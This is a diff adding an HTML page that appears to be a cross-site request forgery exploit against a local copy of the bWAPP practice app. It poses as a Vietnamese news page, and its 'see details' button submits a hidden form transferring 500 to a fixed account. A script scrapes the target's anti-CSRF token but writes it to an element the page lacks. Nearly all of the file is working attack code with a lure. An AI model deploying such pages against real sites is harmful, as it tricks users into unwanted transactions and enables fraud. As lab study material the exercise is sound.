@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Hà Nội ngày nay (Trans)</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!-- <meta name="referrer" content="origin" /> -->
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <!-- <script defer>history.pushState("", "", "http://localhost/bwapp/csrf_2.php")</script> -->
+   
+  </head>
+  <body>
+    <!-- <div class="jumbotron text-center" style="background-color: tan;">
+      <h1>Covid 19 Hà Nội</h1>
+    </div> -->
+
+    <div class="container">
+      <form action="http://localhost/bwapp/csrf_2.php" method="GET">
+        <div style="display: none">
+          <input
+            type="text"
+            id="account"
+            name="account"
+            value="111-111-111-4"
+          />
+          <input type="text" id="amount" name="amount" value="500" />
+        </div>
+        <div class="row">
+          <div class="col-lg-9">
+            <!-- <h3>
+              3000 ca mắc mới trong cộng đồng, Hệ thống y tế Hà Nội quá tải
+            </h3> -->
+          </div>
+          <div class="col-lg-3">
+            <button
+              class="btn btn-primary"
+              type="submit"
+              name="action"
+              value="transfer"
+            >
+              Xem chi tiết
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+
+
+
+
+    <script defer>
+      var token = null;
+      var fields2 = {
+        key: "public",
+        description: "test",
+        paste: "this is a test paste",
+        format: "JSON",
+      };
+
+      function getcsrf() {
+        var xmlHttp = new XMLHttpRequest();
+        // history.pushState("", "", "http://localhost/bwapp/csrf_2.php");
+        xmlHttp.onload = function () {
+          token = this.responseText;
+          let regexp = /value\=\"([A-Za-z0-9]{3,})\"/gi;
+          ans = regexp.exec(token);
+          token = ans[1];
+        };
+        xmlHttp.open(
+          "GET",
+          "http://localhost/bwapp/csrf_2.php",
+          // +"?account=123-45678-90&amount=0&token=038ea3504fc37652ca60a2eab45b9ae084891088&action=transfer"
+          true
+        );
+        // xmlHttp.setRequestHeader("Access-Control-Allow-Headers", "*");
+        // xmlHttp.setRequestHeader("Content-type", "application/ecmascript");
+        // xmlHttp.setRequestHeader("Content-type", "application/json");
+        // xmlHttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+        // xmlHttp.setRequestHeader("Access-Control-Allow-Credentials", true);
+        // xmlHttp.setRequestHeader("Access-Control-Allow-Methods", "GET");
+        // xmlHttp.setRequestHeader("Origin", "http://localhost/bwapp/csrf_2.php");
+        // xmlHttp.setRequestHeader("Referer", "http://localhost/bwapp/csrf_2.php");
+        xmlHttp.send();
+      }
+      window.onload = function () {
+        getcsrf();
+        // alert(token);
+        document.getElementById("key").value = token;
+      };
+    </script>
+  </body>
+</html>
